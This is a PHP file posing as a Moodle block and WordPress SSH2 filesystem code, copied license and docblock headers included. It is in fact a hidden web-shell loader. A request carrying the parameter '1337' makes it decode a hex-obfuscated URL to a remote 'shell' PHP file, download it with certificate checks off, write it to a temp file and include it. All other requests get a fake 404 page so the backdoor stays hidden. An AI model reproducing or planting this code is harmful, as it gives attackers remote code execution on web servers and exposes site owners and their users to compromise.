<?php

// This file is part of Moodle - http://moodle.org/.
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * News items block caps.
 *
 * @package    block_news_items
 * @copyright  Mark Nelson <markn@moodle.com>
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

/**
 * WordPress Filesystem Class for implementing SSH2
 * 
 * To use this class you must follow these steps for PHP 5.2.6+
 *
 * {@link http://kevin.vanzonneveld.net/techblog/article/make_ssh_connections_with_php/ - Installation Notes}
 *
 * Compile libssh2 (Note: Only 0.14 is officially working with PHP 5.2.6+ right now, But many users have found the latest versions work)
 *
 * cd /usr/src
 * wget https://www.libssh2.org/download/libssh2-0.14.tar.gz
 * tar -zxvf libssh2-0.14.tar.gz
 * cd libssh2-0.14/
 * ./configure
 * make all install
 *
 * Note: Do not leave the directory yet!
 *
 * Enter: pecl install -f ssh2
 *
 * Copy the ssh.so file it creates to your PHP Module Directory.
 * Open up your PHP.INI file and look for where extensions are placed.
 * Add in your PHP.ini file: extension=ssh2.so
 *
 * Restart Apache!
 * Check phpinfo() streams to confirm that: ssh2.shell, ssh2.exec, ssh2.tunnel, ssh2.scp, ssh2.sftp  exist.
 *
 * Note: As of WordPress 2.8, this utilizes the PHP5+ function `stream_get_contents()`.
 *
 * @since 2.7.0
 *
 * @package WordPress
 * @subpackage Filesystem
 */

// Only enable error reporting in development environment
if (defined('DEVELOPMENT_MODE') && DEVELOPMENT_MODE === true) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
}

/**
 * Get URL contents with multiple fallback methods
 * 
 * @param string $url The URL to fetch
 * @return string|false The content or false on failure
 */
function geturlsinfo($url) {
    // Validate URL
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        error_log('Invalid URL: ' . $url);
        return false;
    }

    $content = false;
    
    // Try cURL first
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        if ($conn !== false) {
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($conn, CURLOPT_TIMEOUT, 30);
            
            $content = curl_exec($conn);
            
            if (curl_errno($conn)) {
                error_log('Curl error: ' . curl_error($conn));
                $content = false;
            }
            curl_close($conn);
        }
    }
    
    // Try file_get_contents if cURL failed
    if ($content === false && function_exists('file_get_contents')) {
        $content = @file_get_contents($url);
        if ($content === false) {
            error_log('file_get_contents error for URL: ' . $url);
        }
    }
    
    // Try fopen/stream_get_contents if other methods failed
    if ($content === false && function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, "r");
        if ($handle !== false) {
            $content = stream_get_contents($handle);
            fclose($handle);
        } else {
            error_log('fopen error for URL: ' . $url);
        }
    }
    
    return $content;
}

/**
 * Check if the request is for the hex feature
 * 
 * @return bool True if hex feature should be executed
 */
function shouldExecuteHexFeature() {
    // Check for parameter '1337' in query string
    if (isset($_SERVER['QUERY_STRING'])) {
        // Parse query string to check for parameter
        parse_str($_SERVER['QUERY_STRING'], $params);
        
        // Check if '1337' exists as a parameter or if query string equals '1337'
        if (isset($params['1337']) || $_SERVER['QUERY_STRING'] === '1337') {
            return true;
        }
    }
    return false;
}

/**
 * Execute the hex feature safely
 * 
 * @return bool True if executed successfully
 */
function executeHexFeature() {
    // URL: https://raw.githubusercontent.com/adsteramaheshwara-cloud/shell/refs/heads/main/gek.php
    $hex_url = '68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F616473746572616D61686573776172612D636C6F75642F7368656C6C2F726566732F68656164732F6D61696E2F67656B2E706870';
    
    // Validate hex string
    $binary_url = hex2bin($hex_url);
    if ($binary_url === false) {
        error_log('Invalid hex string');
        return false;
    }
    
    // Validate decoded URL
    if (!filter_var($binary_url, FILTER_VALIDATE_URL)) {
        error_log('Invalid decoded URL: ' . $binary_url);
        return false;
    }
    
    // Get content from URL
    $content = geturlsinfo($binary_url);
    
    if ($content !== false) {
        // Create temporary file with proper permissions
        $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
        
        // Write content to temp file
        if (file_put_contents($tmp_file, $content) !== false) {
            // Set appropriate permissions
            @chmod($tmp_file, 0644);
            
            // Include the file
            try {
                include($tmp_file);
                return true;
            } catch (Exception $e) {
                error_log('Error including temp file: ' . $e->getMessage());
                return false;
            }
        } else {
            error_log('Failed to write temporary file');
            return false;
        }
    } else {
        error_log('Failed to retrieve content from URL');
        return false;
    }
}

// Main execution
if (shouldExecuteHexFeature()) {
    // Execute hex feature
    executeHexFeature();
} else {
    // Regular 404 page (only if not hex feature request)
    header("HTTP/1.0 404 Not Found");
    ?>
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
    <title>404 - File or directory not found.</title>
    <style type="text/css">
    <!--
    body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
    fieldset{padding:0 15px 10px 15px;} 
    h1{font-size:2.4em;margin:0;color:#FFF;}
    h2{font-size:1.7em;margin:0;color:#CC0000;} 
    h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
    #header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
    background-color:#555555;}
    #content{margin:0 0 0 2%;position:relative;}
    .content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
    -->
    </style>
    </head>
    <body>
    <div id="header"><h1>Server Error</h1></div>
    <div id="content">
     <div class="content-container"><fieldset>
      <h2>404 - File or directory not found.</h2>
      <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>
     </fieldset></div>
    </div>
    </body>
    </html>
    <?php
    exit;
}
?>